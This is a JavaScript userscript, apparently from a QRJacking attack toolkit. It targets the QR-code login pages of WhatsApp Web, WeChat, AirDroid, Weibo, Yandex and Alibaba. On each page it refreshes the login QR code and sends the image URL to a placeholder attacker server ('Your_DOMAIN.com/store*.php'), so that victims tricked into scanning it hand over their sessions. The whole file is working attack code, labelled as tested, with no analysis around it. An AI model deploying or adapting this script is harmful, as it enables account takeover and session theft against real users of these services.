// ==UserScript==
// @name        QRJacking Module
// @namespace   Seekuritylabs (@Seekurity)
// ==/UserScript==
var myTimer;
myTimer = window.setInterval(loopForQR, 5000);
function loopForQR() {
  if (document.readyState == 'complete') {
    $service = window.location.href;

//WhatsApp (Finished) (Implemented) (Tested) 
    if ($service.indexOf('web.whatsapp.com') >= 0)
    {
      if (document.getElementsByClassName('qr-button')[0] !== undefined)
      {
        document.getElementsByClassName('qr-button')[0].click();
      }
      if (document.getElementsByClassName('icon icon-chat')[0] == null)
      {
        var xhttp = new XMLHttpRequest();
        xhttp.open('GET', 'https://www.Your_DOMAIN.com/storeWhatsapp.php?c=' + document.getElementsByTagName('img')[0].src, true);
        xhttp.send();
      }
    }

//WeChat (Finished) (Implemented) (Tested) 
    if ($service.indexOf('.wechat.com') >= 0)
    {
      if (document.getElementsByClassName('qrcode') [0] !== undefined)
      {
      }
      if (document.getElementsByClassName('qrcode') [0] !== null)
      {
        var xhttp = new XMLHttpRequest();
        xhttp.open('GET', 'https://www.Your_DOMAIN.com/storeWechat.php?c=' + encodeURIComponent(document.getElementsByClassName('img') [0].src), true);
        xhttp.send();
      }
    }

//AirDroid (Finished) (Implemented) (Tested) 
    if ($service.indexOf('web.airdroid.com') >= 0)
    {
      if (document.getElementsByClassName('qr-button') [0] !== undefined)
      {
      }
      if (document.getElementsByClassName('widget-login-qr-imgWrapper widget-login-qr-loading') [0] !== null)
      {
        var xhttp = new XMLHttpRequest();
        xhttp.open('GET', 'https://www.Your_DOMAIN.com/storeAirdroid.php?c=' + encodeURIComponent(document.getElementsByTagName('img') [14].src), true);
        xhttp.send();
      }
    }  
 
//Weibo (Finished) (Implemented) (Tested) 
     if ($service.indexOf('weibo.com') >= 0)
    {
      if (document.getElementsByClassName('qr-button') [0] !== undefined)
      {
      }
      if ( document.getElementsByTagName('img')[1].src !== null)
      {
        var xhttp = new XMLHttpRequest();
        xhttp.open('GET', 'https://www.Your_DOMAIN.com/storeWeibo.php?c=' + encodeURIComponent(document.getElementsByTagName('img')[1].src), true);
        xhttp.send();
      }
    }  

//Yandex Mail (Finished) (Implemented) (Tested) 
    $service = window.location.href;
    if ($service.indexOf('passport.yandex.com') >= 0)
    {
      if (document.getElementsByClassName('qr-button') [0] !== undefined)
      {
      }
      if (document.getElementsByClassName('qr-code__i')[0].style.getPropertyValue("background-image") !== null)
      {
        var a=document.getElementsByClassName('qr-code__i')[0].style.getPropertyValue("background-image");
        var res = a.replace("url(\"/auth", "https://passport.yandex.com/auth"); 
        var res2 = res.replace("\"), none","");

        var xhttp = new XMLHttpRequest();
        xhttp.open('GET', 'https://www.Your_DOMAIN.com/storeYandex.php?c=' + encodeURIComponent(res2), true);
        xhttp.send();
      }
    }  

//Alibaba (Finished) (Implemented) (Tested) 
    if ($service.indexOf('passport.alibaba.com') >= 0)
    {
      if (document.getElementsByClassName('fm-button refresh J_QRCodeRefresh')[0] !== undefined)
      {
        document.getElementsByClassName('fm-button refresh J_QRCodeRefresh')[0].click();
      }
      if (document.getElementsByTagName('img')[0].src !== null)
      {
        var xhttp = new XMLHttpRequest();
        xhttp.open('GET', 'https://www.Your_DOMAIN.com/storeAlibaba.php?c=' + document.getElementsByTagName('img')[0].src, true);
        xhttp.send();
      }
    }  



  }
}
